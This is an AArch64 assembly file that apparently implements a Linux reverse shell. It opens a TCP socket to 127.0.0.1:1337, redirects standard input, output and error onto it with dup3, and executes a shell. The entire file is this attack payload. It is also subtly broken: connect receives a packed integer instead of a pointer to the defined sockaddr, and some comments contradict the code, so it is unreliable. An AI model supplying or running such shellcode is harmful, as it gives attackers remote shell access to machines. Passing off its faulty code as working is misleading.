.section .text
.global _start
_start:
    // socketfd = socket(2, 1, 0)
    mov x0, #2 // protocol = IPPROTO_TCP
    mov x1, #1 // type = SOCK_STREAM
    mov x2, #0 // protocol = 0 (IPPROTO_IP)
    mov x8, #198 // int socket(int domain, int type, int protocol)
    svc  #0
    // save socketfd
    mov  x4, x0 //socketfd

    // connect(socketfd, &sockaddr, 16)
    // lsl  x1, x1, #1
    // movk x1, #0x3905, lsl #16
    // movk x1, #0x7F, lsl #32
    // movk x1, #0x0100, lsl #48
    // str  x1, [sp, #-8]!
    // add  x1, sp, x2
    //ldr x1, =sockaddr
    //mov    x1, ((HOST << 32) | ((((PORT & 0xFF) << 8) | (PORT >> 8)) << 16)
    mov x1, #0x0100007F
    lsl x1, x1, #32
    mov x1, #0x0539
    and x1, x1, #0xFF
    lsl x1, x1, #8
    mov x2, #0x0539
    lsr x2, x2, #8
    orr x1, x1, x2
    lsl x1, x1, #16
    // orr x1, x0, x1



    mov  x2, #16
    mov  x8, #203
    svc  #0 // here you can put whatewer number, even #1337

    mov  x0, x4
    mov  x1, #0
    mov  x2, xzr
    mov  x8, #24
    svc  #0

    mov  x0, x4
    mov  x1, #1
    mov  x2, xzr
    mov  x8, #24
    svc  #0

    mov  x0, x4
    mov  x1, #2
    mov  x2, xzr
    mov  x8, #24
    svc  #0


    // execve("/bin/sh", 0, 0)
    ldr  x0, =shell // mov x0 #shell
    mov  x1, xzr
    mov  x2, xzr
    mov  x8, #221
    svc  #0

.section .data
    shell: .asciz "/bin/bash"

    sockaddr:
        .byte 0x02             // sin_family 2
        .short 0x3905          // sin_port 1337 (in network byte order)
        .word 0x0100007f       // sin_addr 127.0.0.1 (in network byte order)
        .byte 0x00

    .equ PORT, 1337
    .equ HOST, 0x0100007F // 127.0.0.1